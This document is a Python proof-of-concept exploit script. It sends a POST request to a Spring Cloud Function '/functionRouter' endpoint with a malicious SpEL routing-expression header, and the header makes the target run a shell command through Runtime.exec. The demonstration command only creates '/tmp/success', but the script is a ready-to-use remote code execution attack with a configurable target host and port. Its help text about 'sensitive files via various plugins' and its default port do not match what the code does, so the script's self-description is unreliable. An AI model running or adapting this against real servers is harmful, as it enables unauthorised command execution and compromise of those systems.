import requests
import argparse

# Set up argument parsing
parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
parser.add_argument('--host', type=str, default='localhost', help='Target host (default: localhost)')
parser.add_argument('--port', type=str, default='8983', help='Target port (default: 8983)')

args = parser.parse_args()

# Use arguments from CLI or default values
host = args.host
port = args.port


# Set up target information
target_host = f"http://{host}:{port}"
exploit_endpoint = "/functionRouter"

# Headers with the vulnerable SpEL expression
headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Connection": "close",
    "spring.cloud.function.routing-expression": 'T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")',
    "Content-Type": "text/plain"
}

# Payload to be sent in the body of the request
payload = "test"

# Step 1: Send the malicious request
print("[*] Sending the malicious request to exploit the vulnerability...")
response = requests.post(f"{target_host}{exploit_endpoint}", headers=headers, data=payload)
print(f"[+] Response Status Code: {response.status_code}")

# Step 2: Verify if the command executed successfully
print("[+] Exploit sent! Check the target server for '/tmp/success'.")
